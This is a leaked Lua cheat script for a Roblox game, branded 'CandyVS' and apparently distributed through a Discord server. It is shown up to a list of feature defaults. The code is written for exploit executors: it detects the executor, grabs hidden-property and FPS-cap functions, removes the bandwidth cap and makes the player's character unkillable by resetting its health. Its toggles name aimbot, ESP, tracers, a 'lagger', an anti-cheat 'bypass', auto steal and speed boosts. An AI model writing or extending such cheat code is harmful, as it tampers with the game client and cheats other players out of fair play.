-- leak by prince https://discord.gg/7Ar8QGZB2j

	if not LPH_OBFUSCATED then
	LPH_NO_VIRTUALIZE = function(callback)
	return callback
	end
	end

	;LPH_NO_VIRTUALIZE(function()

	do
	local scriptEnv = _G
	pcall(function()
	if type(getfenv) == "function" then scriptEnv = getfenv(0) end
	end)
	local sharedEnv = scriptEnv
	pcall(function()
	if type(getgenv) == "function" then sharedEnv = getgenv() end
	end)
	if type(scriptEnv) ~= "table" then scriptEnv = _G end
	if type(sharedEnv) ~= "table" then sharedEnv = scriptEnv end

	local hiddenSetter = rawget(scriptEnv, "sethiddenproperty")
	or rawget(sharedEnv, "sethiddenproperty")
	or rawget(scriptEnv, "set_hidden_property")
	or rawget(sharedEnv, "set_hidden_property")
	or rawget(scriptEnv, "sethiddenprop")
	or rawget(sharedEnv, "sethiddenprop")
	local synApi = rawget(scriptEnv, "syn") or rawget(sharedEnv, "syn")
	if type(hiddenSetter) ~= "function" and type(synApi) == "table" then
	hiddenSetter = rawget(synApi, "sethiddenproperty") or rawget(synApi, "set_hidden_property")
	end
	if type(hiddenSetter) == "function" then
	pcall(function() rawset(scriptEnv, "sethiddenproperty", hiddenSetter) end)
	pcall(function() rawset(sharedEnv, "sethiddenproperty", hiddenSetter) end)
	end
	local fpsCapSetter = rawget(scriptEnv, "setfpscap")
	or rawget(sharedEnv, "setfpscap")
	or rawget(scriptEnv, "set_fps_cap")
	or rawget(sharedEnv, "set_fps_cap")
	or rawget(scriptEnv, "setfpslimit")
	or rawget(sharedEnv, "setfpslimit")
	if type(fpsCapSetter) ~= "function" and type(synApi) == "table" then
	fpsCapSetter = rawget(synApi, "setfpscap") or rawget(synApi, "set_fps_cap")
	end
	if type(fpsCapSetter) == "function" then pcall(fpsCapSetter, 9999) end
	end

	local Players, UserInputService, TweenService, RunService, ReplicatedStorage,
	Lighting, HttpService, Player, isMobile = (function()
	local players = game:GetService("Players")
	local input = game:GetService("UserInputService")
	local mobile = input.TouchEnabled
	pcall(function()
	local platform = input:GetPlatform()
	mobile = input.TouchEnabled and (
	platform == Enum.Platform.Android
	or platform == Enum.Platform.IOS
	or not input.MouseEnabled
	)
	end)

	return players,
	input,
	game:GetService("TweenService"),
	game:GetService("RunService"),
	game:GetService("ReplicatedStorage"),
	game:GetService("Lighting"),
	game:GetService("HttpService"),
	players.LocalPlayer,
	mobile
	end)()

	local executorName = "unknown"
	do
	local executorEnv = _G
	pcall(function()
	if type(getgenv) == "function" then executorEnv = getgenv() end
	end)
	if type(executorEnv) ~= "table" then executorEnv = _G end
	local identify = rawget(executorEnv, "identifyexecutor")
	or rawget(executorEnv, "getexecutorname")
	or (type(_G) == "table" and (rawget(_G, "identifyexecutor") or rawget(_G, "getexecutorname")))
	if type(identify) == "function" then
	pcall(function()
	local name = identify()
	if name ~= nil then executorName = tostring(name) end
	end)
	end
	end
	local waveSafeMode = string.find(string.lower(executorName), "wave", 1, true) ~= nil
	_G.__CandyVSWaveSafeMode = waveSafeMode

	do
	local guiRootNames = {
	"CandyVS_Panel", "CandyVSHub", "CandyVS", "CandyVS_Panel", "DashEffectGui", "CandyVSAutoGrabBar", "CandyVSOverhead",
	"CandyVSLaggerGUI", "CandyVSBypassGUI", "CandyVSMobileUI",
	"CandyVSEnemyWidget",
	}

	pcall(function()
	local oldBypass = _G.CandyVSBypass
	if oldBypass then
	if oldBypass.Stop then
	oldBypass.Stop()
	else
	if oldBypass.SetAutoOnSteal then oldBypass.SetAutoOnSteal(false) end
	if oldBypass.SetBypass then oldBypass.SetBypass(false) end
	end
	end
	end)
	pcall(function()
	local oldLagger = _G.CandyVSLagger
	if oldLagger then
	if oldLagger.Stop then
	oldLagger.Stop()
	else
	if oldLagger.SetEnabled then oldLagger.SetEnabled(false) end
	if oldLagger.SetLowEndEnabled then oldLagger.SetLowEndEnabled(false) end
	end
	end
	end)
	if _G.__CANDYVS_STATE then
	_G.__CANDYVS_STATE.alive = false
	pcall(function()
	for _, stopper in ipairs(_G.__CANDYVS_STATE.stoppers or {}) do pcall(stopper) end
	for _, conn in ipairs(_G.__CANDYVS_STATE.conns or {}) do pcall(function() conn:Disconnect() end) end
	end)
	end
	_G.__CANDYVS_STATE = nil
	_G.__CandyVSTrackConn = nil
	_G.__CandyVSTrackStopper = nil

	pcall(function()
	if _G.__speedBoostConn then _G.__speedBoostConn:Disconnect(); _G.__speedBoostConn = nil end
	end)
	pcall(function() if _G.__stopSpeedBoost then _G.__stopSpeedBoost() end end)
	pcall(function()
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
	end)

	pcall(function()
	local coreGui = game:GetService("CoreGui")
	for _, container in ipairs({ coreGui, Player.PlayerGui }) do
	for _, name in ipairs(guiRootNames) do
	while true do
	local found = container:FindFirstChild(name)
	if not found then break end
	found:Destroy()
	end
	end
	end
	end)

	pcall(function()
	for _, plr in ipairs(Players:GetPlayers()) do
	local ch = plr.Character
	if ch then
	for _, part in ipairs(ch:GetChildren()) do
	for _, child in ipairs(part:GetChildren()) do
	if child.Name == "GreenDuelsBB" or child.Name == "CandyVSSpeedBill" or child.Name == "CandyVSOverhead"
	or child.Name == "CandyVSAimbotBodyLock" or child.Name == "CandyVSAimbotBodyAttachment"
	or child.Name == "CandyVSTPBatMarkerBodyLock" or child.Name == "CandyVSTPBatMarkerAttachment" then
	child:Destroy()
	end
	end
	end
	end
	end
	end)

	_G.__CANDYVS_STATE = { conns = {}, stoppers = {}, alive = true }
	_G.__CandyVSTrackConn = function(conn)
	if conn then table.insert(_G.__CANDYVS_STATE.conns, conn) end
	return conn
	end
	_G.__CandyVSTrackStopper = function(fn)
	if fn then table.insert(_G.__CANDYVS_STATE.stoppers, fn) end
	end
	_G.__CandyVSResetHooks = {}
	_G.__CandyVSOnNewInstance = function(fn)
	if fn then table.insert(_G.__CandyVSResetHooks, fn) end
	end
	end
	local candyvsRuntimeState = _G.__CANDYVS_STATE
	do
	local traversalJobs = {}
	local traversalConnection = nil
	local function ensureTraversalRunner()
	if traversalConnection then return end
	traversalConnection = RunService.Heartbeat:Connect(function()
	local deadline = os.clock() + 0.0008
	while traversalJobs[1] and os.clock() < deadline do
	local job = traversalJobs[1]
	if job.cancelled or (job.continue and not job.continue()) then
	table.remove(traversalJobs, 1)
	else
	local object = job.pending[#job.pending]
	if not object then
	table.remove(traversalJobs, 1)
	else
	job.pending[#job.pending] = nil
	pcall(job.apply, object)
	local ok, children = pcall(function() return object:GetChildren() end)
	if ok then
	for _, child in ipairs(children) do job.pending[#job.pending + 1] = child end
	end
	if traversalJobs[2] then
	table.remove(traversalJobs, 1)
	traversalJobs[#traversalJobs + 1] = job
	end
	end
	end
	end
	if not traversalJobs[1] then
	traversalConnection:Disconnect()
	traversalConnection = nil
	end
	end)
	_G.__CandyVSTrackConn(traversalConnection)
	end
	_G.__CandyVSWalkDescendantsBatched = function(roots, apply, shouldContinue)
	local job = { pending = {}, apply = apply, continue = shouldContinue, cancelled = false }
	if typeof(roots) == "Instance" then roots = { roots } end
	for _, root in ipairs(roots or {}) do
	if root then
	local ok, children = pcall(function() return root:GetChildren() end)
	if ok then for _, child in ipairs(children) do job.pending[#job.pending + 1] = child end end
	end
	end
	traversalJobs[#traversalJobs + 1] = job
	ensureTraversalRunner()
	return function() job.cancelled = true end
	end
	_G.__CandyVSTrackStopper(function()
	for _, job in ipairs(traversalJobs) do job.cancelled = true end
	traversalJobs = {}
	if traversalConnection then traversalConnection:Disconnect(); traversalConnection = nil end
	end)
	end
	local CONFIG_FILE = "CandyVS_UI_Config.txt"

	do
	local antiDieEnabled = false
	local antiDieStopped = false
	_G.__CandyVSAntiDieGuiEnabled = nil
	local antiDieCharConns = {}
	local antiDieCharAddedConn = nil

	local function clearCharEntry(char, restore)
	local entry = antiDieCharConns[char]
	if entry then
	if entry.healthConn then pcall(function() entry.healthConn:Disconnect() end) end
	if entry.diedConn then pcall(function() entry.diedConn:Disconnect() end) end
	if entry.cleanupConn then pcall(function() entry.cleanupConn:Disconnect() end) end
	antiDieCharConns[char] = nil
	end
	if restore and char and char.Parent then
	pcall(function()
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
	hum.BreakJointsOnDeath = true
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
	end
	end)
	end
	end

	local function applyAntiDieToCharacter(char)
	if not char or not char.Parent then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end

	clearCharEntry(char, false)

	hum.BreakJointsOnDeath = false
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)

	local entry = { humanoid = hum }
	entry.healthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
	if antiDieEnabled and antiDieCharConns[char] == entry and hum.Health <= 0 then
	hum.Health = hum.MaxHealth
	end
	end)

	entry.diedConn = hum.Died:Connect(function()
	task.defer(function()
	if antiDieEnabled and antiDieCharConns[char] == entry and hum and hum.Parent then
	hum.BreakJointsOnDeath = false
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
	hum.Health = hum.MaxHealth
	end
	end)
	end)

	entry.cleanupConn = char.AncestryChanged:Connect(function()
	if not char.Parent then
	clearCharEntry(char, false)
	end
	end)

	antiDieCharConns[char] = entry
	end

	local function setAntiDieEnabled(enabled)
	enabled = enabled == true
	if enabled == antiDieEnabled then return end
	antiDieEnabled = enabled
	if enabled then
	if not antiDieCharAddedConn then
	antiDieCharAddedConn = Player.CharacterAdded:Connect(function(char)
	task.wait(0.2)
	if antiDieEnabled and char and char.Parent then
	applyAntiDieToCharacter(char)
	end
	end)
	end
	local char = Player.Character
	if char and char.Parent and not antiDieCharConns[char] then
	applyAntiDieToCharacter(char)
	end
	else
	for char in pairs(antiDieCharConns) do
	clearCharEntry(char, true)
	end
	end
	end

	local antiDieSources = { toggle = false, autobat = false }
	local function refreshAntiDie()
	if antiDieStopped then return end
	local manual = antiDieSources.toggle
	if _G.__CandyVSAntiDieGuiEnabled then manual = _G.__CandyVSAntiDieGuiEnabled() == true end
	setAntiDieEnabled(manual or antiDieSources.autobat)
	end

	_G.__CandyVSAntiDieSource = function(source, enabled)
	if antiDieStopped or antiDieSources[source] == nil then return end
	antiDieSources[source] = enabled == true
	refreshAntiDie()
	end

	_G.__CandyVSAntiDieSet = function(enabled)
	_G.__CandyVSAntiDieSource("autobat", enabled)
	end

	_G.__CandyVSAntiDieIsEnabled = function() return antiDieEnabled end

	_G.__CandyVSTrackStopper(function()
	antiDieStopped = true
	antiDieSources.toggle = false
	antiDieSources.autobat = false
	setAntiDieEnabled(false)
	end)
	local antiDieCharAddedTracked = false
	local _antiDieOrigSet = setAntiDieEnabled
	setAntiDieEnabled = function(enabled)
	_antiDieOrigSet(enabled)
	if antiDieCharAddedConn and not antiDieCharAddedTracked then
	antiDieCharAddedTracked = true
	_G.__CandyVSTrackConn(antiDieCharAddedConn)
	end
	end
	_G.__CandyVSTrackConn(RunService.Heartbeat:Connect(function()
	if antiDieStopped then return end
	refreshAntiDie()
	if not antiDieEnabled then return end
	local char = Player.Character
	local hum = char and char.Parent and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local entry = antiDieCharConns[char]
	if not entry or entry.humanoid ~= hum then applyAntiDieToCharacter(char) end
	if hum.BreakJointsOnDeath then hum.BreakJointsOnDeath = false end
	if hum:GetStateEnabled(Enum.HumanoidStateType.Dead) then
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
	end
	if hum.Health <= 0 then hum.Health = hum.MaxHealth end
	end))
	end

	FeatureToggles = FeatureToggles or {}

	local toggleStates = {}
	local transientToggles = {
	["Aimbot"] = true,
	["Lagger Aimbot"] = true,
	["Autoplay"] = true,
	["Lagger"] = true,
	}
	local mobileFeatures = {
	["Aimbot"] = true,
	["Drop"] = true,
	["TP Down"] = true,
	["Autoplay"] = true,
	["ESP Players"] = true,
	["Player Tracers"] = true,
	}
	local mobileShortcutStates = {}
	local mobileBtnPlaced = {}
	for featName, _ in pairs(mobileFeatures) do
	mobileShortcutStates[featName] = false
	mobileBtnPlaced[featName] = true
	end

	local speedValues = {
	NormalBoost = 59,
	NormalSteal = 29,
	LaggerBoost = 40,
	LaggerSteal = 20,
	DesyncBoost = 59,
	DesyncSteal = 29,
	BypassPower = 300000,
	BypassDepth = 296,
	MobileButtonScale = 1.0,
	FOV = 90,
	StretchIntensity = 0.75,
	CypherAimbotApproachSpeed = 60,
	AutoTPDownHeight = 20,
	}
	local customSpeeds = {}
	local autoStealValues = {
	Radius      = 65,
	Duration    = 1.3,
	}
	local autoStealMode = "v1"
	local skinChangerMode = "V1"
	local selectedMode = "Normal"
	local selectedIntroMusicIndex = 1
	local normalSpeed = 59
	local carrySpeed = 30
	local laggerSpeed = 40
	local speedToggled = false
	local carrySpeedMode = "v1" 
	local laggerEnabled = false
	local lastMoveDir = Vector3.new(0, 0, 0)
	local MOVE_KEYS = {
	[Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
	[Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
	}
	local _prevSpeed = false
	local FeatureKeybinds = {
	SelectNormalMode = nil,
	SelectLaggerMode = nil,
	Drop = nil,
	Autoplay = nil,
	["Toggle UI"] = nil,
	["Speed Boost"] = nil,
	["Aimbot"] = nil,
	["Anti Bat"] = nil,
	["Carry Speed"] = nil,
	BypassToggle = nil,
	BypassAuto = nil,
	FuckerToggle = nil,
	}
	local listeningBindBtn = nil
	local listeningFeature = nil
	local _allBindBtns = {}
	local _featureToggleMap = {}
	local toggleVisualUpdaters = {}
	local toggleStateSetters = {}
	local ragdollCounterPaused = false
	local FeaturePostToggle = FeaturePostToggle or {}
	local FPSLabel = nil
	local PingLabel = nil
	local StatsRightFps = nil
	local StatsRightPing = nil
	_G = _G or {}
	_G.__CandyVSDropMode = (_G.__CandyVSDropMode == "Jump Drop") and "Jump Drop" or "Stand Drop"
	_G["_CandyVS_UI_Data"] = _G["_CandyVS_UI_Data"] or {}
	local mobileButtonPositions = {}
	local quickButtonPositions = {}
	_G.__CandyVSButtonsSize = 1
	_G.__CandyVSUIScale = 80
	_G.__CandyVSGuiPositionResetters = {}
	_G.__CandyVSResetButtonPositions = nil
	_G.__CandyVSGuiPositionsReset = false
	_G.__CandyVSRoundPanelBackground = function(image, panel)
		local mask = Instance.new("CanvasGroup")
		mask.Name = "RoundedBackgroundMask"
		mask.Size = UDim2.fromScale(1, 1)
		mask.Position = UDim2.fromOffset(0, 0)
		mask.BackgroundTransparency = 1
		mask.BorderSizePixel = 0
		mask.GroupTransparency = 0
		mask.ZIndex = image.ZIndex
		mask.Parent = panel
		local panelCorner = panel:FindFirstChildOfClass("UICorner")
		local corner = Instance.new("UICorner", mask)
		corner.CornerRadius = panelCorner and panelCorner.CornerRadius or UDim.new(0, 16)
		local imageCorner = image:FindFirstChildOfClass("UICorner")
		if imageCorner then imageCorner:Destroy() end
		image.Parent = mask
	end
	_G.__CandyVSFramePanelBackground = function(image, index, panel)
		image.ScaleType = Enum.ScaleType.Crop
		if panel == "Bypass" then
			image.Size = UDim2.new(1, 0, 1.02, 0)
			image.Position = UDim2.fromScale(0, -0.02)
		else
			image.Size = UDim2.fromScale(1, 1)
			image.Position = UDim2.fromScale(0, 0)
		end
	end

	_G.__CandyVSAddOriginalGui3Title = function(parent, panel)
	if parent then parent.Text = string.upper(tostring(panel or "ECLIPSE")) end
	end

	local function clampOffsetsInsideViewport(scaleX, offsetX, scaleY, offsetY, width, height, sizeScale)
	local camera = workspace.CurrentCamera
	local vs = camera and camera.ViewportSize or Vector2.new(1920, 1080)
	if vs.X <= 0 or vs.Y <= 0 then return offsetX, offsetY end
	sizeScale = sizeScale or 1
	width = width * sizeScale
	height = height * sizeScale
	local minX = -vs.X * scaleX
	local maxX = vs.X * (1 - scaleX) - width
	local minY = -vs.Y * scaleY
	local maxY = vs.Y * (1 - scaleY) - height
	if maxX < minX then maxX = minX end
	if maxY < minY then maxY = minY end
	return math.clamp(offsetX, minX, maxX), math.clamp(offsetY, minY, maxY)
	end

	local function placeInsideViewport(gui, scaleX, offsetX, scaleY, offsetY, sizeScale)
	local width = gui.Size.X.Offset
	local height = gui.Size.Y.Offset
	local x, y = clampOffsetsInsideViewport(scaleX, offsetX, scaleY, offsetY, width, height, sizeScale)
	gui.Position = UDim2.new(scaleX, x, scaleY, y)
	return x, y
	end

	local isScrollDragging = false
	local function attachCleanHubTap(btn, onTap)
	return false
	end
	local cleanTapStates = setmetatable({}, { __mode = "k" })
	_G.__CandyVSTrackConn(UserInputService.InputChanged:Connect((function(inp)
	local states = cleanTapStates[inp]
	if not states then return end
	if inp.UserInputType ~= Enum.UserInputType.Touch and inp.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	for _, state in ipairs(states) do
	if (inp.Position - state.tapStart).Magnitude > 12 then state.tapMoved = true end
	end
	end)))
	_G.__CandyVSTrackConn(UserInputService.InputEnded:Connect(function(inp)
	local states = cleanTapStates[inp]
	if not states then return end
	cleanTapStates[inp] = nil
	for _, state in ipairs(states) do
	if not state.tapMoved and not isScrollDragging then
	local scrollMoved = state.scroll and state.scrollCanvasAtStart
	and math.abs(state.scroll.CanvasPosition.Y - state.scrollCanvasAtStart) > 5
	if not scrollMoved then state.callback() end
	end
	end
	end))

	local function connectBtn(btn, callback)
	if attachCleanHubTap(btn, callback) then return end
	btn.InputBegan:Connect(function(inp)
	if inp.UserInputType ~= Enum.UserInputType.Touch and inp.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	local activeScroll = Scroll
	local states = cleanTapStates[inp]
	if not states then states = {}; cleanTapStates[inp] = states end
	table.insert(states, {
	tapStart = inp.Position,
	tapMoved = false,
	scroll = activeScroll,
	scrollCanvasAtStart = activeScroll and activeScroll.CanvasPosition.Y or nil,
	callback = callback,
	})
	end)
	end


	local darkPalette = {
	["245,250,255"] = Color3.fromRGB(25, 31, 42),
	["235,245,255"] = Color3.fromRGB(31, 49, 70),
	["210,230,250"] = Color3.fromRGB(35, 57, 82),
	["190,220,250"] = Color3.fromRGB(55, 105, 160),
	["140,190,240"] = Color3.fromRGB(60, 135, 205),
	["80,160,255"] = Color3.fromRGB(38, 112, 205),
	["50,110,190"] = Color3.fromRGB(255, 140, 0),
	["80,130,200"] = Color3.fromRGB(165, 210, 255),
	["40,80,150"] = Color3.fromRGB(150, 200, 255),
	["30,90,200"] = Color3.fromRGB(130, 190, 255),
	["60,120,200"] = Color3.fromRGB(150, 205, 255),
	["100,140,200"] = Color3.fromRGB(165, 210, 255),
	}
	local GUI_WATCH_PROPERTIES = {"BackgroundColor3", "BorderColor3"}
	local TEXT_COLOR_PROPERTIES = {"BackgroundColor3", "TextColor3", "BorderColor3"}
	local TEXT_WATCH_PROPERTIES = {"TextColor3", "TextStrokeColor3", "TextStrokeTransparency"}
	local applyDarkPaletteTo
	local grayscaleStates = setmetatable({}, {__mode = "k"})
	local function applyGrayscaleProperty(instance, property)
		if not instance or not instance[property] then return end
		local state = grayscaleStates[instance]
		if not state then state = {}; grayscaleStates[instance] = state end
		if state[property] == nil then state[property] = instance[property] end
		if _G.__CandyVSGuiTheme == "GUI 2" then
			local color = instance[property]
			local value = color.R * 0.299 + color.G * 0.587 + color.B * 0.114
			instance[property] = Color3.new(math.min(1, value * 1.05), value * 0.72, value * 0.35)
		else
			instance[property] = state[property]
		end
	end
	local buttonThemeStates = setmetatable({}, {__mode = "k"})
	local function applyButtonTheme(instance)
	local owner = instance
	while owner and not owner:IsA("GuiButton") and not owner:GetAttribute("CandyVSButtonThemeControl") do
	owner = owner.Parent
	end
	if not owner then return end
	local property = instance:IsA("UIStroke") and "Color"
		or instance:IsA("UIGradient") and "Color"
		or instance:IsA("GuiObject") and "BackgroundColor3"
	if not property then return end
	local state = buttonThemeStates[instance]
	if not state then
	state = {}
	buttonThemeStates[instance] = state
	_G.__CandyVSTrackConn(instance:GetPropertyChangedSignal(property):Connect(function()
	applyButtonTheme(instance)
	end))
	end
	if state.busy then return end
	local current = instance[property]
	if current == state.applied and state.theme == _G.__CandyVSGuiTheme then return end
	if current ~= state.applied then state.original = current end
	local theme = _G.__CandyVSGuiTheme
	local function tint(color)
	if theme ~= "GUI 2" and theme ~= "GUI 3" then return color end
	local brightness = math.max(color.R, color.G, color.B)
		local dark = theme == "GUI 2" and Color3.fromRGB(28, 28, 28) or Color3.fromRGB(43, 13, 17)
		local bright = theme == "GUI 2" and Color3.fromRGB(205, 205, 205) or Color3.fromRGB(246, 65, 77)
	return dark:Lerp(bright, brightness)
	end
	local result = state.original
	if instance:IsA("UIGradient") then
	if theme == "GUI 2" or theme == "GUI 3" then
	local points = {}
	for _, point in ipairs(result.Keypoints) do
	table.insert(points, ColorSequenceKeypoint.new(point.Time, tint(point.Value)))
	end
	result = ColorSequence.new(points)
	end
	else
	result = tint(result)
	end
	state.applied = result
	state.theme = theme
	if current ~= result then
	state.busy = true
	instance[property] = result
	state.busy = false
	end
	end
	applyDarkPaletteTo = (function(instance)
	if not instance then return end
	local colorProperties = nil
	if instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
	colorProperties = TEXT_COLOR_PROPERTIES
	elseif instance:IsA("GuiObject") then
	colorProperties = GUI_WATCH_PROPERTIES
	end
		if colorProperties then
		for _, property in ipairs(colorProperties) do
		local color = instance[property]
		local key = string.format("%d,%d,%d", math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5))
		if darkPalette[key] then instance[property] = darkPalette[key] end
		end
		end
		if _G.__CandyVSGuiTheme == "GUI 2" or (_G.__CandyVSGuiTheme ~= "GUI 2" and grayscaleStates[instance]) then
			local themeControlled = false
			local owner = instance
			while owner do
				if owner:IsA("GuiButton") or owner:GetAttribute("CandyVSButtonThemeControl") then
					themeControlled = true
					break
				end
				owner = owner.Parent
			end
			if instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
				applyGrayscaleProperty(instance, "TextColor3")
				applyGrayscaleProperty(instance, "TextStrokeColor3")
			end
			if instance:IsA("GuiObject") and not themeControlled then
				applyGrayscaleProperty(instance, "BackgroundColor3")
				applyGrayscaleProperty(instance, "BorderColor3")
			end
		end
		if instance:IsA("UIStroke") then
		local color = instance.Color
	local key = string.format("%d,%d,%d", math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5))
	if color.B > color.R + 12 and color.B >= color.G then instance.Color = Color3.fromRGB(0, 0, 0)
		elseif darkPalette[key] then instance.Color = darkPalette[key] end
		if not (instance.Parent and (instance.Parent:IsA("GuiButton") or instance.Parent:GetAttribute("CandyVSButtonThemeControl"))) then
			applyGrayscaleProperty(instance, "Color")
		end
		end
	if not _G.__CandyVSModernGuiActive and not instance:GetAttribute("CandyVSDarkPaletteWatched") then
	instance:SetAttribute("CandyVSDarkPaletteWatched", true)
	local function watchProperty(property)
	_G.__CandyVSTrackConn(instance:GetPropertyChangedSignal(property):Connect(function()
	applyDarkPaletteTo(instance)
	end))
	end
	if instance:IsA("UIStroke") then
	watchProperty("Color")
	elseif instance:IsA("GuiObject") then
	for _, property in ipairs(GUI_WATCH_PROPERTIES) do watchProperty(property) end
	if instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
	for _, property in ipairs(TEXT_WATCH_PROPERTIES) do watchProperty(property) end
	end
	end
	end
	applyButtonTheme(instance)
	end)

	_G.__CandyVSThemeRoots = {}
	local themeWalkCancels = setmetatable({}, { __mode = "k" })
	_G.__CandyVSRegisterThemeRoot = (function(root)
	if not root then return end
	for _, savedRoot in ipairs(_G.__CandyVSThemeRoots) do
	if savedRoot == root then return end
	end
	table.insert(_G.__CandyVSThemeRoots, root)
	applyDarkPaletteTo(root)
	if themeWalkCancels[root] then themeWalkCancels[root]() end
	themeWalkCancels[root] = _G.__CandyVSWalkDescendantsBatched(root, applyDarkPaletteTo, function()
	return root.Parent ~= nil
	end)
	_G.__CandyVSTrackConn(root.DescendantAdded:Connect(applyDarkPaletteTo))
	end)
	_G.__CandyVSApplyTheme = (function()
	for _, root in ipairs(_G.__CandyVSThemeRoots) do
	if root and root.Parent then
	applyDarkPaletteTo(root)
	if themeWalkCancels[root] then themeWalkCancels[root]() end
	themeWalkCancels[root] = _G.__CandyVSWalkDescendantsBatched(root, applyDarkPaletteTo, function()
	return root.Parent ~= nil
	end)
	end
	end
	end)

_G.__CandyVSAddUnifiedPanelShade = function(parent, cornerRadius, zIndex)
	local oldShade = parent and parent:FindFirstChild("UnifiedBackgroundShade")
	if oldShade then oldShade:Destroy() end
	local oldOutline = parent and parent:FindFirstChild("UnifiedPanelWhiteOutline")
	if oldOutline then oldOutline:Destroy() end
	local oldGlow = parent and parent:FindFirstChild("UnifiedPanelWhiteGlow")
	if oldGlow then oldGlow:Destroy() end
	local shade = Instance.new("Frame")
	shade.Name = "UnifiedBackgroundShade"
	shade.Size = UDim2.fromScale(1, 1)
	shade.Position = UDim2.fromScale(0, 0)
	shade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	shade.BackgroundTransparency = 0.68
	shade.BorderSizePixel = 0
	shade.Active = false
	shade.ZIndex = zIndex or 1
	shade.Parent = parent
	Instance.new("UICorner", shade).CornerRadius = UDim.new(0, cornerRadius or 16)
	local shadeGradient = Instance.new("UIGradient", shade)
	shadeGradient.Rotation = 90
	shadeGradient.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 0.28),
	NumberSequenceKeypoint.new(0.55, 0.42),
	NumberSequenceKeypoint.new(1, 0.56),
	})
	local outline = Instance.new("UIStroke")
	outline.Name = "UnifiedPanelWhiteOutline"
	outline.Color = Color3.fromRGB(255, 140, 0)
	outline.Thickness = 1.5
	outline.Transparency = 0.28
	outline.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	outline.LineJoinMode = Enum.LineJoinMode.Round
	outline.Parent = parent
	local outlineGradient = Instance.new("UIGradient", outline)
	outlineGradient.Rotation = 90
	outlineGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(165, 165, 165)),
	})
	local softGlow = Instance.new("UIStroke")
	softGlow.Name = "UnifiedPanelWhiteGlow"
	softGlow.Color = Color3.fromRGB(180, 60, 20)
	softGlow.Thickness = 4.5
	softGlow.Transparency = 0.72
	softGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	softGlow.LineJoinMode = Enum.LineJoinMode.Round
	softGlow.Parent = parent
	local glowGradient = Instance.new("UIGradient", softGlow)
	glowGradient.Rotation = 90
	glowGradient.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 0.08),
	NumberSequenceKeypoint.new(0.55, 0.22),
	NumberSequenceKeypoint.new(1, 0.38),
	})
	return shade
end

	local gamepadInputTypes = {
	[Enum.UserInputType.Gamepad1] = true,
	[Enum.UserInputType.Gamepad2] = true,
	[Enum.UserInputType.Gamepad3] = true,
	[Enum.UserInputType.Gamepad4] = true,
	[Enum.UserInputType.Gamepad5] = true,
	[Enum.UserInputType.Gamepad6] = true,
	[Enum.UserInputType.Gamepad7] = true,
	[Enum.UserInputType.Gamepad8] = true,
	}

	local function isBindableInput(input)
	return input
	and input.KeyCode
	and input.KeyCode ~= Enum.KeyCode.Unknown
	and (input.UserInputType == Enum.UserInputType.Keyboard or gamepadInputTypes[input.UserInputType])
	end

	local function isClearKeybindInput(input)
	return input
	and input.UserInputType == Enum.UserInputType.Keyboard
	and input.KeyCode == Enum.KeyCode.RightControl
	end

	local mouseButtonMap = {}
	local mouseButtonDisplay = {
	["MB3"] = "Mouse3",
	}
	pcall(function() mouseButtonMap[Enum.UserInputType.MouseButton3] = "MB3" end)
	local function isMouseSideButton(input)
	return input and mouseButtonMap[input.UserInputType] ~= nil
	end
	local function getMouseButtonBind(input)
	return mouseButtonMap[input.UserInputType]
	end

	local function keybindDisplayName(key)
	if not key then return "-" end
	if type(key) == "string" then return mouseButtonDisplay[key] or key end
	return tostring(key):match("KeyCode%.(.+)") or tostring(key)
	end

	local toggleDefaults = {}
	toggleDefaults["Inf Jump"] = false
	toggleDefaults["Anti Bat"] = false
	toggleDefaults["TP Down"] = false
	toggleDefaults["Auto TP Down"] = false
	toggleDefaults["Anti Ragdoll"] = false
	toggleDefaults["Ragdoll Counter"] = false
	toggleDefaults["Medusa Counter"] = false
	toggleDefaults["Aimbot"] = false
	toggleDefaults["Lagger Aimbot"] = false
	toggleDefaults["Autoplay"] = false
	toggleDefaults["Drop"] = false
	toggleDefaults["auto steal"] = false
	toggleDefaults["Auto Steal Lock"] = false
	toggleDefaults["ESP Players"] = false
	toggleDefaults["Player Tracers"] = false
	toggleDefaults["Show Buttons"] = false
	toggleDefaults["Lock Buttons"] = false
	toggleDefaults["Show FPS"] = false
	toggleDefaults["FPS Boost"] = false
	toggleDefaults["Anti Lag"] = false
toggleDefaults["Optimizer"] = true
	toggleDefaults["Lagger"] = false
	toggleDefaults["Bypass"] = false
	toggleDefaults["Speed Boost"] = false
	toggleDefaults["Toggle UI"] = true
	toggleDefaults["Auto Steal Speed"] = false
	toggleDefaults["Auto Carry Speed"] = false
	toggleDefaults["Carry Speed"] = false
	toggleDefaults["Unwalk"] = false
	toggleDefaults["Harder Hit Anim"] = false
	toggleDefaults["Animaciones"] = false
	toggleDefaults["Custom FOV"] = false
	toggleDefaults["Stretchz Res"] = false
	toggleDefaults["Sky Changer"] = false
	toggleDefaults["Skin Changer"] = false
	toggleDefaults["Headless Visual"] = false
